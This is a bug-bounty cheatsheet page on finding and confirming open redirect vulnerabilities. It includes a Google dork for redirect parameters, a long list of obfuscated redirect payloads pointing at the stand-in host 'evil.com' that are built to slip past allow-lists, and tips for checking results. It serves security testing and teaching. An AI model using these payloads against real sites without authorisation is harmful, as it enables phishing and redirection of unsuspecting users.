---
title: "Open-Redirects"
description: "Essential cheatsheet for identifying and testing Open Redirect vulnerabilities in web applications, detailing entry point discovery, common payloads, and verification methods for ethical testing."
seo:
  title: "Open Redirect Vulnerability Testing Cheatsheet"
  description: "A comprehensive guide to finding Open Redirects in web applications. Covers methods for discovering vulnerable parameters via history, JavaScript, and bruteforcing, along with specific payloads and verification techniques."
---

## How to find entry points to test?

- Caido HTTP history (look at URLs with parameters)
- [Google dorking](/cheatsheets/osint/google-dorks)

  ```txt
  site:target.com inurl:(go= OR return= OR r_url= OR returnUrl= OR returnUri= OR locationUrl= OR goTo= OR return_url= OR next= OR continue= OR checkout_url= OR dest= OR destination= OR image_url= OR redirect= OR redir= OR return_path= OR return_to= OR rurl= OR target= OR view=)
  ```

- Functionalities usually associated with redirects:
  - Login, Logout, Register & Password reset pages
  - Change site language
  - Links in emails
- Read JavaScript code
- Bruteforcing using [fuff](/cheatsheets/web/discovery/#fuff) or caido (see the [payload](/cheatsheets/bugbounty/web/open-redirects/#payload) above)

## Payload

<!-- TODO: Caido & Ffuf instructions -->

{{< details "Show the payload" >}}

```txt
/〱evil.com
〱evil.com
$2f%2fevil.com
$2f%2fevil.com%2f%2f
%01https://evil.com
/%09/evil.com
//%09/evil.com
///%09/evil.com
////%09/evil.com
/%09/whitelisted.com@evil.com
//%09/whitelisted.com@evil.com
///%09/whitelisted.com@evil.com
////%09/whitelisted.com@evil.com
%2f$2fevil.com
/%2f%2fevil.com
//%2f%2fevil.com
%2fevil.com
%2fevil.com//
%2fevil.com%2f%2f
/%5cevil.com
/%5cwhitelisted.com@evil.com
//%5cwhitelisted.com@evil.com
///%5cwhitelisted.com@evil.com
////%5cwhitelisted.com@evil.com
/cgi-bin/redirect.cgi?https://evil.com
?checkout_url=https://evil.com
?continue=https://evil.com
?dest=https://evil.com
?destination=https://evil.com
//evil%00.com
/\evil%252ecom
evil%252ecom
../evil.com
.evil.com
/.evil.com
/////evil.com
/////evil.com/
////\;@evil.com
////evil.com
////evil.com/
////evil.com//
///;@evil.com
///\;@evil.com
///evil.com
///evil.com/
///evil.com//
//;@evil.com
//\/evil.com/
//\evil.com
//evil.com
//evil.com/
//evil.com//
/<>//evil.com
/\/\/evil.com/
/\/evil.com
/\/evil.com/
/\evil.com
/evil.com
<>//evil.com
@evil.com
\/\/evil.com/
evil.com
evil.com%23@whitelisted.com
////evil.com/%2e%2e
///evil.com/%2e%2e
//evil.com/%2e%2e
/evil.com/%2e%2e
//evil.com/%2E%2E
////evil.com/%2e%2e%2f
///evil.com/%2e%2e%2f
//evil.com/%2e%2e%2f
////evil.com/%2f..
///evil.com/%2f..
//evil.com/%2f..
//evil.com/%2F..
/evil.com/%2F..
////evil.com/%2f%2e%2e
///evil.com/%2f%2e%2e
//evil.com/%2f%2e%2e
/evil.com/%2f%2e%2e
//evil.com//%2F%2E%2E
//evil.com:80#@whitelisted.com/
//evil.com:80?@whitelisted.com/
evil.com/.jpg
//evil.com\twhitelisted.com/
//evil.com/whitelisted.com
//evil.com\@whitelisted.com
evil.com/whitelisted.com
//evil%E3%80%82com
?go=https://evil.com
http:%0a%0devil.com
/http://evil.com
/http:/evil.com
http://.evil.com
http://;@evil.com
http://evil.com
http:/\/\evil.com
http:/evil.com
http:evil.com
http://evil.com%23.whitelisted.com/
http://evil.com%2f%2f.whitelisted.com/
http://evil.com%3F.whitelisted.com/
http://evil.com%5c%5c.whitelisted.com/
http://evil.com:80#@whitelisted.com/
http://evil.com:80?@whitelisted.com/
http://evil.com\twhitelisted.com/
/https://%09/evil.com
https://%09/evil.com
https://%09/whitelisted.com@evil.com
https://%0a%0devil.com
/https:/%5cevil.com/
/https://%5cevil.com
https:/%5cevil.com/
https://%5cevil.com
/https://%5cwhitelisted.com@evil.com
https://%5cwhitelisted.com@evil.com
//https://evil.com//
/https://evil.com
/https://evil.com/
/https://evil.com//
/https:evil.com
https://////evil.com
https://evil.com
https://evil.com/
https://evil.com//
https:/\evil.com
https:evil.com
//https:///evil.com/%2e%2e
/https://evil.com/%2e%2e
https:///evil.com/%2e%2e
//https://evil.com/%2e%2e%2f
https://evil.com/%2e%2e%2f
/https://evil.com/%2f..
https://evil.com/%2f..
/https:///evil.com/%2f%2e%2e
/https://evil.com/%2f%2e%2e
https:///evil.com/%2f%2e%2e
https://evil.com/%2f%2e%2e
https://:@evil.com\@whitelisted.com
https://evil.com#whitelisted.com
https://evil.com/whitelisted.com
https://evil.com?whitelisted.com
https://evil.com\whitelisted.com
https://evil%E3%80%82com
//https://whitelisted.com@evil.com//
/https://whitelisted.com@evil.com/
https://whitelisted.com.evil.com
https://whitelisted.com;@evil.com
https://whitelisted.com@evil.com
https://whitelisted.com@evil.com/
https://whitelisted.com@evil.com//
/https://whitelisted.com@evil.com/%2e%2e
https:///whitelisted.com@evil.com/%2e%2e
//https://whitelisted.com@evil.com/%2e%2e%2f
https://whitelisted.com@evil.com/%2e%2e%2f
/https://whitelisted.com@evil.com/%2f..
https://whitelisted.com@evil.com/%2f..
/https:///whitelisted.com@evil.com/%2f%2e%2e
/https://whitelisted.com@evil.com/%2f%2e%2e
https:///whitelisted.com@evil.com/%2f%2e%2e
https://whitelisted.com@evil.com/%2f%2e%2e
https://whitelisted.com/https://evil.com/
@https://www.evil.com
http://whitelisted.com@evil.com/
?image_url=https://evil.com
/login?to=https://evil.com
?next=https://evil.com
/out/https://evil.com
/out?https://evil.com
/redirect/https://evil.com
?redirect=https://evil.com
?redirect_uri=https://evil.com
?redirect_url=https://evil.com
?redir=https://evil.com
?return=https://evil.com
?return_path=https://evil.com
?return_to=https://evil.com
?returnTo=https://evil.com
?rurl=https://evil.com
?target=https://evil.com
?url=https://evil.com
?view=https://evil.com
/\whitelisted.com:80%40evil.com
whitelisted.com@%E2%80%AE@evil.com
////whitelisted.com@evil.com/
////whitelisted.com@evil.com//
///whitelisted.com@evil.com/
///whitelisted.com@evil.com//
//whitelisted.com@evil.com/
//whitelisted.com@evil.com//
whitelisted.com.evil.com
whitelisted.com;@evil.com
////whitelisted.com@evil.com/%2e%2e
///whitelisted.com@evil.com/%2e%2e
////whitelisted.com@evil.com/%2e%2e%2f
///whitelisted.com@evil.com/%2e%2e%2f
//whitelisted.com@evil.com/%2e%2e%2f
////whitelisted.com@evil.com/%2f..
///whitelisted.com@evil.com/%2f..
//whitelisted.com@evil.com/%2f..
```

{{</details>}}

{{< callout note >}} In the payload, replace "whitelisted.com" by a whitelisted domain. {{< /callout >}}

## How to check for success?

The most reliable way to confirm a successful Open Redirect is to check the **HTTP response headers** from the server immediately after submitting the malicious payload.

A successful exploitation results in an HTTP status code indicating a redirection (usually **301**, **302**, **307**, or **303**) and the presence of a `Location` header pointing to your external, unauthorized domain (`evil.com`).

### Caido HTTPQL Filter

To quickly filter your Caido history for potential successes, you can use the following HTTPQL query to look for something else than the supposed redirection domain.

```httpql
resp.raw.ncont:"location: https:\/\/target.com"
```

## Tips

- Try using the same parameter twice: `?next=whitelisted.com&next=google.com`
- If extension checked, try ?image_url={payload}/.jpg
- Try `target.com/?redirect_url=.uk`. If it redirects to `target.com.uk`, then it’s vulnerable! target.com.uk and target.com are different domains.

## Open Redirects Challenges

- [Root-me - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
